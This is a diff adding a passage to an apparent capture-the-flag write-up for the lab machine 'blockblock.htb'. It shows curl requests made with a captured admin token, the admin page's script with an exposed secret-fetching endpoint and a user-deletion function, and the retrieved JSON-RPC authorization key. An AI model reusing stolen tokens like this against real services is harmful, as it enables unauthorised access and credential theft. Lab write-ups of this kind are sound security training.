@@ -843,3 +843,85 @@ A new `Admin` section pops up after refreshing the home page:
 A user `keira` is found in the users list:
 
 ![image](https://github.com/user-attachments/assets/1e424c71-5ba4-4805-9b6c-8e5879d86b2e)
+
+Atttempting to check user messages with admin token didn't work:
+
+```console
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/get_user_messages?username=keira
+<!doctype html>
+<html lang=en>
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+```
+
+### 4.1. Inspect source on the admin page
+
+Another script is found in the admin page source which reveals `/api/chat_addres` and `/api/json-rpc` endpoint
+
+```js
+<script>
+        (async () => {
+            const jwtSecret = await (await fetch('/api/json-rpc')).json();
+            const web3 = new Web3(window.origin + "/api/json-rpc");
+            const postsCountElement = document.getElementById('chat-posts-count');
+            let chatAddress = await (await fetch("/api/chat_address")).text();
+            let postsCount = 0;
+            chatAddress = (chatAddress.replace(/[\n"]/g, ""));
+
+            // })();
+            // (async () => {
+            //     let jwtSecret = await (await fetch('/api/json-rpc')).json();
+
+            let balance = await fetch(window.origin + "/api/json-rpc", {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    "token": jwtSecret['Authorization'],
+                },
+                body: JSON.stringify({
+                    jsonrpc: "2.0",
+                    method: "eth_getBalance",
+                    params: [chatAddress, "latest"],
+                    id: 1
+                })
+            });
+            let bal = (await balance.json()).result // || '0';
+            console.log(bal)
+            document.getElementById('donations').innerText = "$" + web3.utils.fromWei(bal,
+                'ether')
+
+        })();
+        async function DeleteUser() {
+            let username = document.getElementById('user-select').value;
+            console.log(username)
+            console.log('deleting user')
+            let res = await fetch('/api/delete_user', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username
+                })
+            })
+        }
+
+    </script>
+```
+
+Querying the `/api/chat_addres` endpoint with the admin token returns a hexadecimal string:
+
+```console
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/chat_address
+"0x38D681F08C24b3F6A945886Ad3F98f856cc6F2f8"
+```
+
+Querying the `/api/json-rpc` endpoint with the admin token returns an `Authorization` key:
+
+```console
+root@kali:~# curl -s -H 'Content-Type: application/json' -H "Cookie:token=$token" http://blockblock.htb/api/json-rpc | jq
+{
+  "Authorization": "0fc23a90bc6b4dd1f8160c7885858d93c1b505af8fd766f6d69d24a88186e383"
+}
+```
